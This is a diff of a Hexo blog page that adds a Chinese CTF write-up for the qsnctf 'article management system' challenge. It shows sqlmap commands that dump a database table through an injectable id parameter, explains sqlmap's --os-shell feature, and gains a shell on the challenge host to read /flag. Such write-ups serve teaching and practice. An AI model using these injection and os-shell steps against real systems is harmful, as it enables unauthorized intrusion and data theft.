@@ -6,20 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://zhouypeng.github.io">
-  <title>a | zhou</title>
+  <title>[qsnctf]文章管理系统 | zhou</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="article">
-<meta property="og:title" content="a">
-<meta property="og:url" content="https://zhouypeng.github.io/2024/04/05/a/index.html">
+  <meta name="description" content="题目考点：SQL注入、命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[qsnctf]文章管理系统">
+<meta property="og:url" content="https://zhouypeng.github.io/2024/04/02/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/index.html">
 <meta property="og:site_name" content="zhou">
+<meta property="og:description" content="题目考点：SQL注入、命令执行">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-04-05T09:10:33.000Z">
-<meta property="article:modified_time" content="2024-04-05T09:35:15.343Z">
+<meta property="og:image" content="http://8.134.115.2/wp-content/uploads/2024/04/%E6%88%AA%E5%9B%BE-1024x333.png">
+<meta property="article:published_time" content="2024-04-02T02:16:42.000Z">
+<meta property="article:modified_time" content="2024-04-05T12:13:08.344Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://8.134.115.2/wp-content/uploads/2024/04/%E6%88%AA%E5%9B%BE-1024x333.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -83,7 +87,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 3
+    			总文章数 9
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -221,14 +225,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-a" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-qsnctf文章管理系统" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      a
+      [qsnctf]文章管理系统
     </h1>
   
 
@@ -240,8 +244,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2024/04/05/a/" class="archive-article-date">
-        <time datetime="2024-04-05T09:10:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-05</time>
+<a href="/2024/04/02/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" class="archive-article-date">
+        <time datetime="2024-04-02T02:16:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-02</time>
 </a>
 
   
@@ -254,7 +258,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">0字</span>
+      <span class="post-count">311字</span>
     </span>
   </span>
 
@@ -276,7 +280,30 @@
  
 
 	
-		
+		<p><strong>题目考点：</strong>SQL注入、命令执行</p>
+<span id="more"></span>
+
+<p>不废话，上题目</p>
+<p><img src="http://8.134.115.2/wp-content/uploads/2024/04/%E6%88%AA%E5%9B%BE-1024x333.png"></p>
+<p>点击下一篇，观察到payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:30280/?id=1</span><br></pre></td></tr></table></figure>
+
+<p>如上?id&#x3D;1，疑似注入点，可能存在注入点，于是使用sqlmap跑一下，发现一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --url=&quot;http://challenge.qsnctf.com:30280/?id=1&quot; -D word -T articles   --dump --batch</span><br><span class="line"></span><br><span class="line">qsnctf&#123;sql+so+easy!!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交提示错误，且题目说了存在一个假的flag，要我们用命令执行</p>
+<p>sqlmap中的–os-shell原理</p>
+<p>在使用sqlmap进行渗透测试时，–os-shell选项允许用户在目标系统上获取一个交互式shell。这个功能背后的原理是通过sqlmap利用SQL注入漏洞在数据库中注入特定的SQL命令，这些命令可以执行系统命令并将输出返回到sqlmap。</p>
+<ul>
+<li>以下是使用–os-shell时可能的步骤：<ul>
+<li>检测目标是否有注入漏洞。</li>
+<li>利用检测到的漏洞获取数据库访问权限。</li>
+<li>上传一个包含系统命令执行功能的脚本到目标服务器。</li>
+<li>执行脚本以获取交互式shell。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> sqlmap --url=&quot;http://challenge.qsnctf.com:30280/?id=1&quot; --os-shell </span><br><span class="line"></span><br><span class="line">find / -name &quot;flag&quot;</span><br><span class="line"></span><br><span class="line">发现存在/flag目录</span><br><span class="line"></span><br><span class="line"> cat /flag 获得flag</span><br><span class="line"></span><br><span class="line"> qsnctf&#123;d6abcfbfcc95467a95acec7a9f5b0f03&#125;</span><br></pre></td></tr></table></figure>
 	
 
 
@@ -314,7 +341,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://zhouypeng.github.io/2024/04/05/a/" title="a" target="_blank">https://zhouypeng.github.io/2024/04/05/a/</a>
+          <a href="https://zhouypeng.github.io/2024/04/02/qsnctf文章管理系统/" title="[qsnctf]文章管理系统" target="_blank">https://zhouypeng.github.io/2024/04/02/qsnctf文章管理系统/</a>
         </li>
         
         <li>
@@ -348,7 +375,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Web漏洞//" class="article-tag-list-link color1">Web漏洞</a>
+        			<a href="/categories/CTFwp//" class="article-tag-list-link color1">CTFwp</a>
         		</li>
       		
 		</ul>
@@ -403,7 +430,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://zhouypeng.github.io/2024/04/05/a/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://zhouypeng.github.io/2024/04/02/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -418,18 +445,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2024/04/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2024/04/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          文件上传
+          命令执行
         
       </div>
     </a>
   
   
-    <a href="/2024/04/05/Python-%E5%AD%97%E5%85%B8%E5%B0%8F%E7%BB%83%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Python 字典小练习</div>
+    <a href="/2024/04/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">反序列化</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -594,7 +621,27 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">伪协议</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">命令执行·</a>
               </li>
              
               <li class="article-tag-list-item">
